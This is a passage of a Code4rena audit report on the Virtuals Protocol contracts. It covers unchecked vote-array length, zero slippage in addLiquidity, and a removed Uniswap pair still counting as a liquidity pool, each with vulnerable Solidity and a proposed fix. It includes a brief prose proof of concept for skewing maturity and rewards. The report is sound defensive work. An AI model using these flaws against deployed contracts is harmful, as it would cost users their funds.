<h3 style="position:relative;" id="recommended-mitigation-steps-15"><a class="anchor before" aria-label="recommended mitigation steps 15 permalink" href="#recommended-mitigation-steps-15"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Inside <code>agentDAO::_updateMaturity</code> add a statement after decoding the params to check that the length of the array of votes/battles is 10 (you could also replace it with a variable):</p>
<pre data-index="70" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    function _updateMaturity(address account, uint256 proposalId, uint256 weight, bytes memory params) internal {</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        address contributionNft = IAgentNft(_agentNft).getContributionNft();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        address owner = IERC721(contributionNft).ownerOf(proposalId);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (owner == address(0)) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            return;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        bool isModel = IContributionNft(contributionNft).isModel(proposalId);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (!isModel) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            return;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint8[] memory votes = abi.decode(params, (uint8[]));</span></span>
<span class="grvsc-line"><span class="grvsc-source">+       if(votes.length() != 10) revert();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 maturity = _calcMaturity(proposalId, votes);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">_proposalMaturities[proposalId] += (maturity * weight);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        emit ValidatorEloRating(proposalId, account, maturity, votes);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span></code></pre>
<h3 style="position:relative;" id="proof-of-concept-12"><a class="anchor before" aria-label="proof of concept 12 permalink" href="#proof-of-concept-12"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<ol>
<li>There’s a proposal for a model update.</li>
<li>A user or the contributor submits a malicious (or many malicious) vote directly to the chain, with more rounds than the 10 determined in the whitepaper, either for or against the proposal.</li>
<li>The ELO and the maturity increases (or decreases) more sharply with those votes.</li>
<li>The resulting <code>serviceNft</code> would have really incorrect information.</li>
<li>The resulting maturity of the <code>serviceNft</code> could end up with an impact of 0 (or a low value) and leave contributor without (or with reduced) rewards, or it could get inflated (and give more rewards than it is fair).</li>
</ol>
<hr>
<h2 style="position:relative;" id="m-12-no-slippage-protection-during-adding-liquidity-to-uniswap"><a class="anchor before" aria-label="m 12 no slippage protection during adding liquidity to uniswap permalink" href="#m-12-no-slippage-protection-during-adding-liquidity-to-uniswap"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-49">[M-12] No slippage protection during adding liquidity to uniswap</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-429">EPSec</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-821">BestBugBusters</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-764">chupinexx</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-126">felconsec</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-17">gmh5225</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-785">Olugbenga</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-464">PotEater</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-267">pro_king</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-678">unique</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-732">wahedtalash77</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactoryV4.sol#L230-L239">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactoryV4.sol#L230-L239</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-2"><a class="anchor before" aria-label="finding description and impact 2 permalink" href="#finding-description-and-impact-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>In the <code>_executeApplication</code> in <code>AgentFactoryV4</code>, during the process of adding liquidity using Uniswap’s <code>IUniswapV2Router02.addLiquidity</code> method, slippage tolerance is set to 0 for both <code>token</code> and <code>assetToken</code>. Specifically, in the following line:</p>
<pre data-index="71" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">IUniswapV2Router02</span><span class="mtk1">(</span><span class="mtk12">_uniswapRouter</span><span class="mtk1">).</span><span class="mtk11">addLiquidity</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">token</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">assetToken</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">initialAmount</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk3">// slippage tolerance for token</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk3">// slippage tolerance for assetToken</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span></code></pre>
<p>Here, the <code>0</code> values for slippage tolerance mean that the liquidity addition will fail if the price of either <code>token</code> or <code>assetToken</code> fluctuates even slightly between when the transaction is initiated and when it’s executed. This is because Uniswap requires that the amount of tokens being swapped remains within a certain tolerance range to prevent slippage.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-16"><a class="anchor before" aria-label="recommended mitigation steps 16 permalink" href="#recommended-mitigation-steps-16"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>To mitigate this issue, the following steps are recommended:</p>
<p><strong>Introduce slippage protection</strong>: Modify the <code>addLiquidity</code> call to include a non-zero slippage tolerance. This ensures that the liquidity addition will proceed within a reasonable range of price variation.</p>
<pre data-index="72" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">slippageTolerance</span><span class="mtk1"> = </span><span class="mtk7">50</span><span class="mtk1">; </span><span class="mtk3">// 0.5% slippage tolerance (adjustable)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">tokenAmountMin</span><span class="mtk1"> = (</span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)) * (</span><span class="mtk7">100</span><span class="mtk1"> - </span><span class="mtk12">slippageTolerance</span><span class="mtk1">)) / </span><span class="mtk7">100</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">assetAmountMin</span><span class="mtk1"> = (</span><span class="mtk12">initialAmount</span><span class="mtk1"> * (</span><span class="mtk7">100</span><span class="mtk1"> - </span><span class="mtk12">slippageTolerance</span><span class="mtk1">)) / </span><span class="mtk7">100</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IUniswapV2Router02</span><span class="mtk1">(</span><span class="mtk12">_uniswapRouter</span><span class="mtk1">).</span><span class="mtk11">addLiquidity</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">token</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">assetToken</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">initialAmount</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">tokenAmountMin</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">assetAmountMin</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    );</span></span></span></code></pre>
<ul>
<li><code>slippageTolerance</code>: The percentage tolerance for slippage. This should be adjusted based on the application’s tolerance for price fluctuation (e.g., 0.5% or 1%).</li>
<li><code>tokenAmountMin</code> and <code>assetAmountMin</code>: These variables calculate the minimum acceptable amounts of <code>token</code> and <code>assetToken</code> that will be added to the liquidity pool, accounting for slippage.</li>
</ul>
<hr>
<h2 style="position:relative;" id="m-13-removal-of-a-liquidity-pool-on-agenttokenremoveliquiditypool-still-incurs-taxes-on-swaps"><a class="anchor before" aria-label="m 13 removal of a liquidity pool on agenttokenremoveliquiditypool still incurs taxes on swaps permalink" href="#m-13-removal-of-a-liquidity-pool-on-agenttokenremoveliquiditypool-still-incurs-taxes-on-swaps"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-51">[M-13] Removal of a liquidity pool on <code>AgentToken::removeLiquidityPool</code> still incurs taxes on swaps</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-558">YouCrossTheLineAlfie</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L279">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L279</a></p>
<h3 style="position:relative;" id="finding-description-7"><a class="anchor before" aria-label="finding description 7 permalink" href="#finding-description-7"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>AgentToken.sol</code> contract uses tax mechanism whenever swaps take place for the added liquidity pools, which can be observed in the transfer functions.</p>
<pre data-index="73" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1">(</span><span class="mtk12">IERC20</span><span class="mtk1">) </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">owner</span><span class="mtk1"> = </span><span class="mtk11">_msgSender</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_transfer</span><span class="mtk1">(</span><span class="mtk12">owner</span><span class="mtk1">, </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">, (</span><span class="mtk11">isLiquidityPool</span><span class="mtk1">(</span><span class="mtk12">owner</span><span class="mtk1">) || </span><span class="mtk11">isLiquidityPool</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">)));      &lt;&lt; @ - </span><span class="mtk3">// if `isLiquidityPool` returns true, then taxes are levied.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>The liquidity pools are added via <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L300"><code>AgentToken::addLiquidityPool</code></a> and during the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L193"><code>AgentToken::_createPair</code></a> call, which takes place during <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L106"><code>initialize</code></a>.</p>
<pre data-index="74" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_createPair</span><span class="mtk1">() </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">uniswapV2Pair_</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uniswapV2Pair_</span><span class="mtk1"> = </span><span class="mtk11">IUniswapV2Factory</span><span class="mtk1">(</span><span class="mtk12">_uniswapRouter</span><span class="mtk1">.</span><span class="mtk11">factory</span><span class="mtk1">()).</span><span class="mtk11">getPair</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">pairToken</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">uniswapV2Pair_</span><span class="mtk1"> == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uniswapV2Pair_</span><span class="mtk1"> = </span><span class="mtk11">IUniswapV2Factory</span><span class="mtk1">(</span><span class="mtk12">_uniswapRouter</span><span class="mtk1">.</span><span class="mtk11">factory</span><span class="mtk1">()).</span><span class="mtk11">createPair</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">pairToken</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">LiquidityPoolCreated</span><span class="mtk1">(</span><span class="mtk12">uniswapV2Pair_</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_liquidityPools</span><span class="mtk1">.</span><span class="mtk11">add</span><span class="mtk1">(</span><span class="mtk12">uniswapV2Pair_</span><span class="mtk1">);        &lt;&lt;@ -- </span><span class="mtk3">// Here the `uniswapV2Pair_` gets rightfully added</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk12">uniswapV2Pair_</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>Similarly, these liquidity pools are removed via <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L321"><code>AgentToken::removeLiquidityPool</code></a></p>
<pre data-index="75" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">removeLiquidityPool</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">removedLiquidityPool_</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwnerOrFactory</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Remove this from the enumerated list:</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_liquidityPools</span><span class="mtk1">.</span><span class="mtk11">remove</span><span class="mtk1">(</span><span class="mtk12">removedLiquidityPool_</span><span class="mtk1">);           &lt;&lt;@ </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">LiquidityPoolRemoved</span><span class="mtk1">(</span><span class="mtk12">removedLiquidityPool_</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>However, the issue lies with the way <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L273"><code>AgentToken::isLiquidityPool</code></a> has been implemented.</p>
<pre data-index="76" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">isLiquidityPool</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">queryAddress_</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">/** @dev We check the uniswapV2Pair address first as this is an immutable variable and therefore does not need</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">         * to be fetched from storage, saving gas if this address IS the uniswapV2Pool. We also add this address</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">         * to the enumerated set for ease of reference (for example it is returned in the getter), and it does</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">         * not add gas to any other calls, that still complete in 0(1) time.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">         */</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk12">queryAddress_</span><span class="mtk1"> == </span><span class="mtk12">uniswapV2Pair</span><span class="mtk1"> || </span><span class="mtk12">_liquidityPools</span><span class="mtk1">.</span><span class="mtk11">contains</span><span class="mtk1">(</span><span class="mtk12">queryAddress_</span><span class="mtk1">));   &lt;&lt; @ - </span><span class="mtk3">// Returns true even if `uniswapV2Pair` is removed.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>As we can observe, even if the <code>uniswapV2Pair</code> is removed from the <code>_liquidityPools</code> via <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L321"><code>AgentToken::removeLiquidityPool</code></a> call, the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L273"><code>AgentToken::isLiquidityPool</code></a> would still return true, which is incorrect and hence, would cause taxes upon swaps leading to unwanted loss of funds for the users.</p>
<h3 style="position:relative;" id="impact-11"><a class="anchor before" aria-label="impact 11 permalink" href="#impact-11"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Broken <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L273"><code>AgentToken::isLiquidityPool</code></a> leads to excessive taxes for swaps to users, leading to loss of funds.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-17"><a class="anchor before" aria-label="recommended mitigation steps 17 permalink" href="#recommended-mitigation-steps-17"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>It is recommended to set <code>uniswapV2Pair</code> to a dead/zero address to avoid <code>isLiquidityPool</code> returning true.</p>
<pre data-index="77" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    function removeLiquidityPool(address removedLiquidityPool_) external onlyOwnerOrFactory {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // Remove this from the enumerated list:</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        _liquidityPools.remove(removedLiquidityPool_);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+       if(removedLiquidityPool_ == uniswapV2Pair){</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+            uniswapV2Pair = address(0);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        emit LiquidityPoolRemoved(removedLiquidityPool_);</span></span></span>
